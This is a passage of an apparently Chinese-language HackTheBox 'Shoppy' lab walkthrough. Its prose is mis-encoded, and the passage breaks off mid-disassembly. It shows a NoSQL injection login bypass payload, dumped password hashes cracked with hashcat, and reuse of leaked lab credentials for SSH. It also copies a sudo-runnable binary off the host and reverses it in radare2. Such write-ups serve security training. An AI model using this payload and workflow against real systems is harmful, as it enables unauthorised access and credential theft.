è§£æï¼Œæˆ‘ä»¬åŠ è¿›å»\n\n```bash\necho 10.10.11.180 shoppy.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Shoppy/WfyNY3no_puTV2jPd_All7D9oO3vFQTLcuiSjxjvrPw.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªä»€ä¹ˆå€’è®¡æ—¶ï¼Œå€’è®¡æ—¶åˆ°äº†å°±ä¼šæ¨å‡ºä¸€ä¸ªä»€ä¹ˆç‰ˆæœ¬ï¼Œå’±ä»¬åšä¸ªä¿¡æ¯æ”¶é›†å…ˆ\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://shoppy.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shoppy.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 291ms]\nadmin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 314ms]\nimages                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 315ms]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 322ms]\nlogin                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 339ms]\nassets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 278ms]\nAdmin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 295ms]\nLogin                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 295ms]\nfonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 277ms]\nADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 277ms]\nexports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 279ms]\n                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 279ms]\nLOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 288ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 23 req/sec :: Duration: [0:03:43] :: Errors: 2 ::\n```\nç»è¿‡æµ‹è¯•ï¼Œåªæœ‰ Login å¯ä»¥è®¿é—®ï¼Œæ˜¯ä¸€ä¸ªç™»é™†é¡µé¢\n\n![image](Hackthebox-Shoppy/WBwPDhoGXNQa1XI4aB8PUKBWqkZX0pQ3eKMMX4b-kgk.png)\n\nè¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸‡èƒ½å¯†ç  admin'||''===' è¿›è¡Œç™»é™†\n\n![image](Hackthebox-Shoppy/GcmtkFUlivIGLn3p3Hz6FnE-3XS_gxDcsZYK3YWu-Ps.png)\n\nç™»å…¥åæ˜¯ä¸€ä¸ªä»·æ ¼è¡¨ï¼Œå³ä¸Šè§’æœ‰ä¸ªæŸ¥è¯¢ç”¨æˆ·çš„åŠŸèƒ½\n\næˆ‘ä»¬æŸ¥è¯¢ä¸‡èƒ½å¯†ç åï¼Œä¼šå¾—åˆ°ä¸¤ä¸ªè´¦æˆ·\n\n```bash\n{\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"}\n{\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"}\n```\n# æ¼æ´åˆ©ç”¨\næŠŠ password æå–å‡ºæ¥ï¼Œä¸¢ hashcat è·‘ä¸€ä¸‹\n\n```bash\necho \"6ebcea65320589ca4f2f1ce039975995\" > hash\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt       \nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: pthread-12th Gen Intel(R) Core(TM) i5-12400F, 1438/2940 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nINFO: All hashes found as potfile and/or empty entries! Use --show to display them.\n\nStarted: Wed Dec 21 22:07:00 2022\nStopped: Wed Dec 21 22:07:00 2022\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show\n6ebcea65320589ca4f2f1ce039975995:remembermethisway\n```\nè¿™è¾¹åªæœ‰ josh çš„è´¦æˆ·çˆ†å‡ºæ¥äº†ï¼Œadmin çš„æ— æ³•çˆ†å‡ºæ¥\n\nä½¿ç”¨è¿™ä¸ªå¯†ç è¿›è¡Œ ssh ç™»é™†ï¼Œæ˜¯å¤±è´¥çš„ï¼Œé‚£å°±è¯æ˜è¿˜æœ‰æˆ‘ä»¬æ²¡æœ‰å‘ç°çš„åœ°æ–¹ï¼Œè¿™é‡Œæˆ‘ä»¬å°è¯•çˆ†ç ´å­åŸŸå\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -H \"Host: FUZZ.shoppy.htb\" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -fs 169\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.180\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n :: Header           : Host: FUZZ.shoppy.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 169\n________________________________________________\n\nmattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 266ms]\n:: Progress: [100000/100000] :: Job [1/1] :: 150 req/sec :: Duration: [0:11:17] :: Errors: 0 ::\n```\nåŠ å…¥åˆ° hosts è§£æä¸­\n\n```bash\necho 10.10.11.180 mattermost.shoppy.htb >> /etc/hosts\n```\næ¥ç€å»è®¿é—®ä¸€ä¸‹\n\n![image](Hackthebox-Shoppy/aKaBFxvX_vfRmsqL9qxyRQSJzdsda4EwH-KzAaqr8P4.png)\n\næ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œç”¨æˆ‘ä»¬åˆšæ‰ç ´è§£å‡ºæ¥çš„è´¦å·å¯†ç å»è¿›è¡Œç™»é™†\n\n```bash\nusername = josh\npassword = remembermethisway\n```\n![image](Hackthebox-Shoppy/MH3Lu48sq_naDTgKDLRD6PHVIVHo4XVsyMIKkrRhLRs.png)\n\nç™»é™†æˆåŠŸï¼Œåˆ°å¤„çœ‹ä¸€ä¸‹ï¼Œåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†\n\n![image](Hackthebox-Shoppy/n0ZwZ9z_PivUPrbXRkrT2vLaxAwJ871NRnTBc5ns06Y.png)\n\nåœ¨ Deploy Machine ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ° jaeger å‘å¸ƒäº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = jaeger\npassword = Sh0ppyBest@pp!\n```\nè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªç”¨ docker éƒ¨ç½²çš„ä¸œè¥¿ï¼Œé‚£åº”è¯¥å¯ä»¥ä½¿ç”¨ ssh è¿›è¡Œç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh jaeger@10.10.11.180 \njaeger@10.10.11.180's password: \nLinux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\njaeger@shoppy:~$ whoami&&id\njaeger\nuid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)\n```\nç™»é™†æˆåŠŸ\n\n```bash\njaeger@shoppy:~$ cat user.txt \nff6024ae7ef749b44ac3fbc6ce9df1ce\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n## User\n```bash\njaeger@shoppy:~$ sudo -l\n[sudo] password for jaeger: \nMatching Defaults entries for jaeger on shoppy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jaeger may run the following commands on shoppy:\n    (deploy) /home/deploy/password-manager\n```\nè¿™é‡Œå‘ç°ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬æƒ³åŠæ³•ç»™ä»–æå‡ºæ¥åœ¨æœ¬åœ°åˆ†æä¸€ä¸‹\n\n```bash\ncd /home/deploy/\npython3 -m http.server 1234\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# wget http://10.10.11.180:1234/password-manager                                  \n--2022-12-22 01:34:58--  http://10.10.11.180:1234/password-manager\næ­£åœ¨è¿æ¥ 10.10.11.180:1234... å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK\né•¿åº¦ï¼š18440 (18K) [application/octet-stream]\næ­£åœ¨ä¿å­˜è‡³: â€œpassword-managerâ€\n\npassword-manager                                     100%[=====================================================================================================================>]  18.01K  63.9KB/s  ç”¨æ—¶ 0.3s    \n\n2022-12-22 01:34:59 (63.9 KB/s) - å·²ä¿å­˜ â€œpassword-managerâ€ [18440/18440])\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# file password-manager                                                                                    \npassword-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped\n```\nè¿™æ˜¯ä¸€ä¸ª 64 ä½çš„å¯æ‰§è¡Œæ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# r2 password-manager \nWarning: run r2 with -e bin.cache=true to fix relocations in disassembly\n[0x00001120]>\n```\nä½¿ç”¨ r2 åˆ†æä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# r2 password-manager \nWarning: run r2 with -e bin.cache=true to fix relocations in disassembly\n[0x00001120]> aaa\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[x] Analyze function calls (aac)\n[x] Analyze len bytes of instructions for references (aar)\n[x] Finding and parsing C++ vtables (avrr)\n[x] Type matching analysis for all functions (aaft)\n[x] Propagate noreturn information (aanr)\n[x] Use -AA or aaaa to perform additional experimental analysis.\n[0x00001120]> afl\n0x00001120    1 43           entry0\n0x00001150    4 41   -> 34   sym.deregister_tm_clones\n0x00001180    4 57   -> 51   sym.register_tm_clones\n0x000011c0    5 57   -> 50   sym.__do_global_dtors_aux\n0x00001110    1 6            sym.imp.__cxa_finalize\n0x00001200    1 5            entry.init0\n0x000013eb    4 73           sym.__static_initialization_and_destruction_0_int__int_\n0x000010e0    1 6            sym.imp.std::ios_base::Init::Init__\n0x00001060    1 6            sym.imp.__cxa_atexit\n0x00001434    1 21           sym._GLOBAL__sub_I_main\n0x00001000    3 23           sym._init\n0x00001205    5 486  -> 426  main\n0x000014b4    1 9            sym._fini\n0x00001450    4 93           sym.__libc_csu_init\n0x000014b0    1 1            sym.__libc_csu_fini\n0x00001030    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const\n0x00001040    1 6            fcn.00001040\n0x00001050    1 6            sym.imp.system\n0x00001070    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_\n0x00001080    1 6            sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_\n0x00001090    1 6            sym.imp.std::ostream::operator___std::ostream____std::ostream__\n0x000010a0    1 6            fcn.000010a0\n0x000010b0    1 6            sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____\n0x000010c0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_\n0x000010d0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__\n0x000010f0    1 6            sym.imp._Unwind_Resume\n0x00001100    1 6            sym.imp.std::allocator_char_::allocator__\n```\nä½¿ç”¨å‡½æ•° `aaa` è‡ªåŠ¨åˆ†æå¹¶å‘½åå‡½æ•°ï¼Œä½¿ç”¨å‡½æ•° `afl` æŸ¥çœ‹ç¨‹åºå†…çš„å‡½æ•°\n\nè¿™é‡Œæ‰¾åˆ°äº† main å‡½æ•°ï¼Œç„¶åå»åˆ° main å‡½æ•°çš„åœ°å€å¹¶æŸ¥çœ‹æ±‡ç¼–ä»£ç \n\n```bash\n[0x00001120]> s main\n[0x00001205]> pdf\n            ; DATA XREF from entry0 @ 0x113d\nâ”Œ 426: int main (int argc, char **argv, char **envp);\nâ”‚           ; var int64_t var_60h @ rbp-0x60\nâ”‚           ; var int64_t var_40h @ rbp-0x40\nâ”‚           ; var int64_t var_11h @ rbp-0x11\nâ”‚           ; var int64_t var_8h @ rbp-0x8\nâ”‚           0x00001205      55             push rbp\nâ”‚           0x00001206      4889e5         mov rbp, rsp\nâ”‚           0x00001209      53             push rbx\nâ”‚           0x0000120a      4883ec58       sub rsp, 0x58\nâ”‚           0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; \"Welcome to Josh password manager!\"\nâ”‚           0x00001215      488d3da42e00.  lea rdi, obj.std::cout      ; sym..bss\nâ”‚                                                                      ; 0x40c0                                                                                                                                    \nâ”‚           0x0000121c      e85ffeffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \nâ”‚           0x00001221      4889c2         mov rdx, rax\nâ”‚           0x00001224      488b05a52d00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \nâ”‚           0x0000122b      4889c6         mov rsi, rax\nâ”‚           0x0000122e      4889d7         mov rdi, rdx\nâ”‚           0x00001231      e85afeffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\nâ”‚           0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; \"Please enter your master password: \"\nâ”‚           0x0000123d      488d3d7c2e00.  lea rdi, obj.std::cout      ; sym..bss\nâ”‚                                                                      ; 0x40c0                                                                                                                                    \nâ”‚           0x00001244      e837feffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \nâ”‚           0x00001249      488d45c0       lea rax, [var_40h]\nâ”‚           0x0000124d      4889c7         mov rdi, rax\nâ”‚           0x00001250      e87bfeffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string() ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__                                                                                                                                                                         \nâ”‚           0x00001255      488d45c0       lea rax, [var_40h]\nâ”‚           0x00001259      4889c6         mov rsi, rax\nâ”‚           0x0000125c      488d3d7d2f00.  lea rdi, obj.std::cin       ; 0x41e0\nâ”‚           0x00001263      e848feffff     call sym std::basic_istream<char, std::char_traits<char> >& std::operator>><char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&) ; sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____                                                                   \nâ”‚           0x00001268      488d45ef       lea rax, [var_11h]\nâ”‚           0x0000126c      4889c7         mov rdi, rax\nâ”‚           0x0000126f      e88cfeffff     call sym std::allocator<char>::allocator() ; sym.imp.std::allocator_char_::allocator__\nâ”‚           0x00001274      488d55ef       lea rdx, [var_11h]\nâ”‚           0x00001278      488d45a0       lea rax, [var_60h]\nâ”‚           0x0000127c      488d35d90d00.  lea rsi, [0x0000205c]\nâ”‚           0x00001283      4889c7         mov rdi, rax\nâ”‚           0x00001286      e835feffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_                                                                                           \nâ”‚           0x0000128b      488d45ef       lea rax, [var_11h]\nâ”‚           0x0000128f      4889c7         mov rdi, rax\nâ”‚           0x00001292      e809feffff     call fcn.000010a0\nâ”‚           0x00001297      488d45a0       lea rax, [var_60h]\nâ”‚           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u\"Sample\"\nâ”‚           0x000012a2      4889c7         mov rdi, rax\nâ”‚           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012aa      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u\"ample\"\nâ”‚           0x000012b5      4889c7         mov rdi, rax\nâ”‚           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012bd      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u\"mple\"\nâ”‚           0x000012c8      4889c7         mov rdi, rax\nâ”‚           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012d0      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u\"ple\"\nâ”‚           0x000012db      4889c7         mov rdi, rax\nâ”‚           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012e3      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u\"le\"\nâ”‚           0x000012ee      4889c7         mov rdi, rax\nâ”‚           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012f6      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; \"e\"\nâ”‚           0x00001301      4889c7         mov rdi, rax\nâ”‚           0x00001304      e867fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x00001309      488d55a0       lea rdx, [var_60h]\nâ”‚           0x0000130d      488d45c0       lea rax, [var_40h]\nâ”‚           0x00001311      4889d6         mov rsi, rdx\nâ”‚           0x00001314      4889c7         mov rdi, rax\nâ”‚           0x00001317      e814fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::compare(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) const ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const                                                                                                                                                                                                               \nâ”‚           0x0000131c      85c0           test eax, eax\nâ”‚           0x0000131e      0f94c0         sete al\nâ”‚           0x00001321      84c0           test al, al\nâ”‚       â”Œâ”€< 0x00001323      743b           je 0x1360\nâ”‚       â”‚   0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; \"Access granted! Here is creds !\"\nâ”‚       â”‚   0x0000132c      488d3d8d2d00.  lea rdi, obj.std::cout      ; sym..bss\nâ”‚       â”‚                                                              ; 0x40c0                                                                                                                                    \nâ”‚       â”‚   0x00001333      e848fdffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \nâ”‚       â”‚   0x00001338      4889c2         mov rdx, rax\nâ”‚       â”‚   0x0000133b      488b058e2c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \nâ”‚       â”‚   0x00001342      4889c6         mov rsi, rax\nâ”‚       â”‚   0x00001345      4889d7         mov rdi, rdx\nâ”‚       â”‚   0x00001348      e843fdffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\nâ”‚       â”‚   0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; \"cat /home/deploy/creds.txt\" ; const char *string\nâ”‚       â”‚   0x00001354      e8f7fcffff     call sym.imp.system         ; int system(const char *string)\nâ”‚       â”‚   0x00001359      bb00000000     mov ebx, 0\nâ”‚      â”Œâ”€â”€< 0x0000135e      eb2d           jmp 0x138d\nâ”‚      â”‚â”‚   ; CODE XREF from main @ 0x1323\nâ”‚      â”‚â””â”€> 0x00001360      488d35490d00.  lea rsi, str.Access_denied__This_incident_will_be_reported__ ; 0x20b0 ; \"Access denied! This incident will be reported !\"\nâ”‚      â”‚    0x00001367      488d3d522d00.  lea rdi, obj.std::cout      ; sym..bss\nâ”‚      â”‚                                                               ; 0x40c0                                                                                                                                    \nâ”‚      â”‚    0x0000136e      e80dfdffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \nâ”‚      â”‚    0x00001373      4889c2         mov rdx, rax\nâ”‚      â”‚    0x00001376      488b05532c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \nâ”‚      â”‚    0x0000137d      4889c6         mov rsi, rax\nâ”‚      â”‚    0x00001380      4889d7         mov rdi, rdx\nâ”‚      â”‚    0x00001383      e808fdffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\nâ”‚      â”‚    0x00001388      bb01000000     mov ebx, 1\nâ”‚      â”‚    ; CODE XREF from main @ 0x135e\nâ”‚      â””â”€â”€> 0x0000138d      488d45a0       lea rax, [var_60h]\nâ”‚           0x00001391      4889c7         mov rdi, rax\nâ”‚           0x00001394      e8a7fcffff     call fcn.00001040\nâ”‚           0x00001399      488d45c0       lea rax, [var_40h]\nâ”‚           0x0000139d      4889c7         mov rdi, rax\nâ”‚           0x000013a0      e89bfcffff     call fcn.00001040\nâ”‚           0x000013a5      89d8           mov eax, ebx\nâ”‚       â”Œâ”€< 0x000013a7      eb3c           jmp 0x13e5\n..\n      â”‚â”‚â”‚   ; CODE XREFS from main @ +0x1b3, +0x1c4\nâ”‚       â”‚   ; CODE XREF from main @ 0x13a7\nâ”‚       â””â”€> 0x000013e5      488b5df8       mov rbx, qword [var_8h]\nâ”‚           0x000013e9      c9             leave\nâ””           0x000013ea      c3             ret\n```\nä½¿ç”¨å‡½æ•° `s main` å®šä½åˆ° main å‡½æ•°çš„åœ°å€ï¼Œä½¿ç”¨å‡½æ•° `pdf` æŸ¥çœ‹å½“å‰å‡½æ•°çš„æ±‡ç¼–ä»£ç \n\n```bash\n0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; \"Welcome to Josh password manager!\"\n```\nè¿™æ˜¯ä¸€ä¸ª c++ å†™çš„ç¨‹åºï¼Œè¿è¡Œç¨‹åºä¹‹åä¼šè¾“å‡º \"Welcome to Josh password manager!\" å­—ç¬¦ä¸²\n\n```bash\n0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; \"Please enter your master password: \"\n```\nç„¶åè¾“å‡º \"Please enter your master password: \" å­—ç¬¦ä¸²ï¼Œå¹¶æ¥å—æˆ‘ä»¬çš„è¾“å…¥\n\n```bash\nâ”‚           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u\"Sample\"\nâ”‚           0x000012a2      4889c7         mov rdi, rax\nâ”‚           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012aa      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u\"ample\"\nâ”‚           0x000012b5      4889c7         mov rdi, rax\nâ”‚           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012bd      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u\"mple\"\nâ”‚           0x000012c8      4889c7         mov rdi, rax\nâ”‚           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012d0      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u\"ple\"\nâ”‚           0x000012db      4889c7         mov rdi, rax\nâ”‚           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012e3      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u\"le\"\nâ”‚           0x000012ee      4889c7         mov rdi, rax\nâ”‚           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string<char, 